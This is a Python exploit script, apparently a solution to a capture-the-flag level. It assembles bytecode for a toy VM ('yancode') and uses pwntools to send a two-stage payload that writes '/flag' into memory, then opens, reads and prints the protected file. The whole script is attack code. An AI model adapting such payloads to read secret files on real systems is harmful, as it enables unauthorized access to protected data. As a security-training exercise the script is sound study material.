
'''
op   : op[3]
arg1 : op[2]
arg2 : op[1]
'''

def getarg(arg):
    if arg[0:2] == "0x":
        return int(arg, 16).to_bytes(1, "little")
    if arg[0] == "*":
        arg=arg[1:]
    ireg = 1
    reg="aicdfsb"
    if reg.find(arg) != -1:
        ireg = ireg << reg.find(arg)
        return ireg.to_bytes(1, "little")
    elif arg == "open":
        return b"\x20"
    elif arg == "read_memory":
        return b"\x02"
    elif arg == "write":
        return b"\x08"
    return None
def assembly(ass):
    if ass == "":
        return b""
    bc = bytearray()
    ass = ass.split(" ")
    if(ass[0] == "IMM"):
        op = b"\x04"
    elif(ass[0] == "ADD"):
        op = b"\x08"
    elif(ass[0] == "STK"):
        op = b"\x20"
    elif(ass[0] == "STM"):
        op = b"\x10"
    elif(ass[0] == "LDM"):
        op = b"\x80"
    elif(ass[0] == "CMP"):
        op = b"\x40"
    elif(ass[0] == "JMP"):
        op = b"\x01"
    elif(ass[0] == "SYS"):
        op = b"\x02"
    
    for i in ass:
        c = getarg(i)
        if c != None:
            bc += bytearray(c) 

    bc.insert(2,op[0])
    return bc
c = bytearray()

asm = '''IMM a = 0x00
IMM b = 0xff
IMM c = 0xff
SYS read_memory d
'''

asm2='''
IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x66
IMM c = 0x81
STM *c = d

IMM d = 0x6c
IMM c = 0x82
STM *c = d

IMM d = 0x61
IMM c = 0x83
STM *c = d

IMM d = 0x67
IMM c = 0x84
STM *c = d

IMM d = 0x0
IMM c = 0x85
STM *c = d
IMM a = 0x80
IMM b = 0x0
SYS open a

IMM b = 0x0
ADD b s
IMM c = 0xff

ADD a d
SYS read_memory d

IMM b = 0x0
ADD b s
IMM c = 0xff
ADD c d
IMM a = 0x1
SYS write d'''
asm = asm.split("\n")
for i in asm:
    c+=assembly(i)


from pwn import *
# display the bytes
# print(disasm(my_sc))
p = process("/challenge/toddlerone_level9.1")
#context.terminal = ['tmux', 'splitw', '-h']
#p = gdb.debug("/challenge/toddlerone_level8.1", gdbscript='continue')
print(p.readuntil(b'yancode: '))
p.send(c)


all = p.recv(timeout=2)

asm2 = asm2.split("\n")
for i in asm2:
    c+=assembly(i)
c.insert(0, b"A"[0])
print(c)

p.send(c)
all = p.recv(timeout=2)
print(all.decode())
